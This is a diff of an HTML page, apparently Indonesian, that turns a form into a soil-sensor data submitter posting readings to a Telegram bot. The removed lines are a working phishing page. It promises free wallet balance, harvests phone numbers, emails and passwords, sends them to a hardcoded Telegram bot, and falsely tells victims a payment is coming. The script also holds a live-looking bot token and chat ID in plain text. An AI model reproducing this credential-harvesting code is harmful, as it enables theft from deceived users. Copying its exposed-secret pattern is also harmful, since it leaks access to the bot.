@@ -39,34 +39,52 @@
 </head>
 <body>
     <div class="container">
-        <img src="./logo.png" alt="logo" width="100">
-        <input type="text" id="name" placeholder="No handphone" required>
-        <input type="email" id="email" placeholder="Email" required>
-        <input type="password" id="password" placeholder="Kode" required>
-        <button onclick="sendToTelegram()">Dapatkan saldo gratis</button>
+        <input type="text" id="tim" placeholder="tim" required>
+        <input type="text" id="latitude" placeholder="latitude" required>
+        <input type="text" id="longitude" placeholder="longitude" required>
+        <input type="text" id="nitrogen" placeholder="nitrogen" required>
+        <input type="text" id="phosphor" placeholder="phosphor" required>
+        <input type="text" id="kalium" placeholder="kalium" required>
+        <input type="text" id="ph" placeholder="ph" required>
+        <input type="text" id="fertility" placeholder="fertility" required>
+        <input type="text" id="humidity" placeholder="humidity" required>
+        <input type="text" id="conductifity" placeholder="conductifity" required>
+        <input type="text" id="moisture" placeholder="moisture" required>
+        <input type="text" id="temperature" placeholder="temperature" required>
+        <button onclick="sendToTelegram()">submit</button>
     </div>
 
     <script>
         function sendToTelegram() {
             const botToken = "8121391946:AAH4HAiB0XngOLBuCxyBDslomB5G3_OrKOs";
             const chatId = "5562048470";
-            const name = document.getElementById("name").value;
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
+            const tim = document.getElementById("tim").value;
+            const latitude = document.getElementById("latitude").value;
+            const longitude = document.getElementById("longitude").value;
+            const nitrogen = document.getElementById("nitrogen").value;
+            const phosphor = document.getElementById("phosphor").value;
+            const kalium = document.getElementById("kalium").value;
+            const ph = document.getElementById("ph").value;
+            const fertility = document.getElementById("fertility").value;
+            const humidity = document.getElementById("humidity").value;
+            const conductifity = document.getElementById("conductifity").value;
+            const moisture = document.getElementById("moisture").value;
+            const temperature = document.getElementById("temperature").value;
+
             
-            if (!name || !email || !password) {
+            if (!tim || !latitude || !longitude || !nitrogen || !phosphor || !kalium || !ph ) {
                 alert("Harap isi semua data!");
                 return;
             }
             
-            const message = `Pendaftaran Baru:\nNama: ${name}\nEmail: ${email}\nPassword: ${password}`;
+            const message = `pengiriman data dari tim ${tim}:\nlatitude: ${latitude}\nlongitude: ${longitude}\nnitrogen: ${nitrogen}\nphosphor: ${phosphor}\nkalium: ${kalium}\nph: ${ph}\nfertility: ${fertility}\nhumidity: ${humidity}\nconductifity: ${conductifity}\nmoisture: ${moisture}\ntemperature: ${temperature}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert("tunggu 10 menit untuk proses transaksi ke dana anda!");
+                        alert("input data berhasil");
                     } else {
                         alert("Gagal mengirim data.");
                     }
